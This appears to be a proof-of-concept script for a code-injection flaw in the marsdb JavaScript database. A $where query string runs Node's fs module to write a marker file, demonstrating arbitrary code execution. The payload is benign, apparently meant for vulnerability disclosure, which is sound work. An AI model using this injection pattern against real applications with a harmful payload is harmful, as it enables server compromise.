let Collection = require('marsdb').Collection;

const posts = new Collection('posts',  {inMemory: true});
posts.insert({text: 'MarsDB is awesome'}).then(docId => {    
    posts.find({$where: "process.mainModule.require('fs').writeFileSync('./marsdb-success.txt', '23')"})
        .then(docs => {
            console.log(docs)
        });
})
